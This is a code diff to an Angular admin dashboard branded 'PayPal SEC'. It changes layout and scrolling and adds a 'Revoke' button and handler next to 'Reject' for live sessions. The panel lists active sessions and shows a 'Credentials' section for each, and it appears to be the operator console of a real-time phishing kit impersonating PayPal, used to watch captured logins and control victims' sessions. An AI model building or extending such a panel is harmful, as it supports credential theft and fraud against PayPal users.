@@ -11,7 +11,7 @@ type AdminTab = 'live' | 'history' | 'settings';
   standalone: true,
   imports: [CommonModule, FormsModule],
   template: `
-    <div class="flex h-screen bg-pp-bg font-sans text-pp-navy overflow-hidden relative">
+    <div class="flex min-h-screen bg-pp-bg font-sans text-pp-navy relative">
       
       <!-- Toast Notification -->
       @if (state.adminToast()) {
@@ -47,7 +47,7 @@ type AdminTab = 'live' | 'history' | 'settings';
       } @else {
 
       <!-- SIDEBAR -->
-      <aside class="w-[70px] lg:w-[260px] bg-pp-navy text-white flex flex-col shrink-0 transition-all duration-300 z-30 shadow-xl">
+      <aside class="w-[70px] lg:w-[260px] bg-pp-navy text-white flex flex-col shrink-0 transition-all duration-300 z-30 shadow-xl lg:sticky lg:top-0 lg:h-screen">
            <div class="h-20 flex items-center px-4 lg:px-6 border-b border-[#ffffff10]">
               <span class="font-bold text-xl tracking-tight hidden lg:block">PayPal <span class="text-pp-success text-xs align-top">SEC</span></span>
               <span class="lg:hidden mx-auto font-bold text-xl">P</span>
@@ -80,7 +80,7 @@ type AdminTab = 'live' | 'history' | 'settings';
       </aside>
 
       <!-- MAIN CONTENT -->
-      <main class="flex-1 flex flex-col h-full relative bg-pp-bg">
+      <main class="flex-1 flex flex-col min-h-0 relative bg-pp-bg">
          
          <!-- Top Bar -->
          <header class="h-16 bg-white border-b border-slate-200 flex items-center justify-between px-6 shrink-0 z-20 sticky top-0 shadow-sm">
@@ -101,16 +101,16 @@ type AdminTab = 'live' | 'history' | 'settings';
          </header>
 
          <!-- Content Area -->
-         <div class="flex-1 overflow-y-auto p-4 lg:p-8">
+         <div class="w-full p-4 lg:p-8">
             
             @switch (activeTab()) {
                 
                 <!-- LIVE MONITOR -->
                 @case ('live') {
-                    <div class="grid grid-cols-1 lg:grid-cols-12 gap-6 lg:h-full">
+                    <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
                         
                         <!-- List Column -->
-                        <div class="lg:col-span-4 bg-white rounded-card shadow-sm border border-slate-100 flex flex-col h-[400px] lg:h-full overflow-hidden">
+                        <div class="lg:col-span-4 bg-white rounded-card shadow-sm border border-slate-100 flex flex-col h-[500px] lg:h-auto lg:min-h-[500px] overflow-hidden">
                              <div class="p-5 border-b border-slate-100 bg-slate-50/50 flex justify-between items-center shrink-0">
                                  <h3 class="font-bold text-base text-pp-navy">Active Sessions</h3>
                                  <span class="bg-pp-blue text-white text-xs px-2 py-1 rounded-md font-bold">{{ state.activeSessions().length }}</span>
@@ -152,7 +152,7 @@ type AdminTab = 'live' | 'history' | 'settings';
                         </div>
 
                         <!-- Details Column (Using Template) -->
-                        <div class="lg:col-span-8 bg-white rounded-card shadow-sm border border-slate-100 flex flex-col h-auto lg:h-full overflow-hidden relative min-h-[500px]">
+                        <div class="lg:col-span-8 bg-white rounded-card shadow-sm border border-slate-100 flex flex-col h-auto overflow-visible relative min-h-[500px]">
                              @if(monitoredSession()) {
                                  <!-- Header -->
                                  <div class="p-6 border-b border-slate-100 flex justify-between items-center bg-slate-50/50 shrink-0">
@@ -174,8 +174,8 @@ type AdminTab = 'live' | 'history' | 'settings';
                                      </div>
                                  </div>
                                  
-                                 <!-- Scrollable Content -->
-                                 <div class="flex-1 overflow-y-auto p-6 lg:p-8 bg-[#F9FAFB]">
+                                 <!-- Content (Scrolls with page now) -->
+                                 <div class="flex-1 p-6 lg:p-8 bg-[#F9FAFB]">
                                      <div class="grid grid-cols-1 md:grid-cols-2 gap-6 pb-20">
                                          
                                          <!-- Credentials -->
@@ -584,6 +584,9 @@ type AdminTab = 'live' | 'history' | 'settings';
 
                     @if(isSessionLive(session)) {
                         <div class="flex gap-3">
+                            <button (click)="revoke()" class="bg-red-50 hover:bg-red-100 text-red-600 border border-red-100 px-6 py-3 rounded-full font-bold text-sm transition-all shadow-sm">
+                                Revoke
+                            </button>
                             <button (click)="reject()" class="bg-slate-100 hover:bg-slate-200 text-slate-700 border border-slate-200 px-6 py-3 rounded-full font-bold text-sm transition-all shadow-sm">
                                 Reject
                             </button>
@@ -707,6 +710,12 @@ export class AdminDashboardComponent {
   deleteSession(session: any) {
       if(confirm('Are you sure you want to delete this session?')) {
           this.state.deleteSession(session.id);
+      }
+  }
+
+  revoke() {
+      if(confirm('Are you sure you want to revoke this session?')) {
+          this.state.adminRevokeSession(this.monitoredSession()!.id);
       }
   }
 
